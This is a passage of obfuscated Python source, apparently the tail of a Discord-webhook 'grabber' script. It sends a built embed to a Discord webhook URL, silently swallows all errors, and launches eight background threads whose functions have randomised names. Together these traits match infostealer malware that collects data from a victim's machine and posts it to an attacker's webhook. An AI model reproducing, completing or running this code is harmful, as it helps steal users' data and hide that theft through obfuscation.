    value=f"""{DTVMTFOATDWCCZWWBSXYGALCQCOMKQKKVBVGVLSHTOMPSKIADP}"""
).set_footer(
    text=QDRJVHGHALOBKZUVZGHSGSKHIAYYHMEDDCFARHRNFMKWQMABQEZJHBWYFFPXMMCTSOH, 
    icon_url=FPEIUYAZUZAWCXCAMWHOAPUNUQKQCELBQYOHPDKYPXULUDXWNEBIHK
)

try:  
    ZKIOUZQNPDUIFRETXNNROEXKPNIBGXYVRNRWCXIXXKOCBJGYKPXVAFBUPNPHXSPPUQQGRLGCXBZCJZGJY = discord.SyncWebhook.from_url(IPVPPDBWMKAPWCCFBRJYNEQRAXCYTZXDCEVDCRENPNXAOJOVRAKPHSTNPEVTLSERJLXJLOH)
    ZKIOUZQNPDUIFRETXNNROEXKPNIBGXYVRNRWCXIXXKOCBJGYKPXVAFBUPNPHXSPPUQQGRLGCXBZCJZGJY.send(embed=embed, username=PHEDBDZQUYJJEESUSPWIJQJTJYXKKDDXEBBMAKKZMRRMQKYDYR, avatar_url=FPEIUYAZUZAWCXCAMWHOAPUNUQKQCELBQYOHPDKYPXULUDXWNEBIHK)
except: pass


try: threading.Thread(target=LFAHZHQIMQPZWEACTKDURCPUPWTWWTWXMLJNEWVHHTDIIZKMMDVTKVSTSKBYQLYWKALFNJVWRDMREPIHCKBMDTYRTGCSFWJR).start()
except: pass
try: threading.Thread(target=OWYQWGLKULYQRUSKDWJYXSIFLMJTFTGTPANCENNLWFKQVVGPNBQXVKOMUZFBILFZDXSLXBQZUYHIXDGIITZDBTMCVTAJ).start()
except: pass
try: threading.Thread(target=CTBGOXIQGGKUUWVZGKJSZGVICDPOQGBSIMGULQXCJGWSOHRZQLECRYEQMQIDVMTCNYZIKYKKXZFDXNIQRDDCAIYVAZKUGHE).start()
except: pass
try: threading.Thread(target=PSYWDDIZRQKFXMKVLHRULSFQPEVLIDVITYLNWWEBPKDAFEFZLYMFOXYOZGIPNDFEJQJXHTVFKHJEZFSIAZTHYTDFGDLAUYZ).start()
except: pass
try: threading.Thread(target=CDZYYCAGJXSJMZZHTIFAHBESGSFVSXVRLEWXXVDSUPOVNOKWLYRUZTBNGTRMLNSSPXULSVFXCQROUSHWFCFSTDICNANXTNMP).start()
except: pass
try: threading.Thread(target=MYEVKGOVRUZGJWWRXSGIGHWAWYDJTDGNJECDGSQDPRNAHNPBFRZQLVCAVDEIANTNPRXGRPSNSUYWVJUTNGRPSP).start()
except: pass
try: threading.Thread(target=JFECVIVZYRWCLHFKSHEFCARBUDQHHOSGGCJTSCZLDFRCWJTANANBQOCLRZHIMYL).start()
except: pass
try: threading.Thread(target=NIEBTHBWBLAZTFBGVJHBTDQSBPFJEBIWZYLVXCDPFDAVUQBBPELVSTPCGAELWGGYHDSRZSUNUSMCFWTXUBWMGTLVN).start()
except: pass
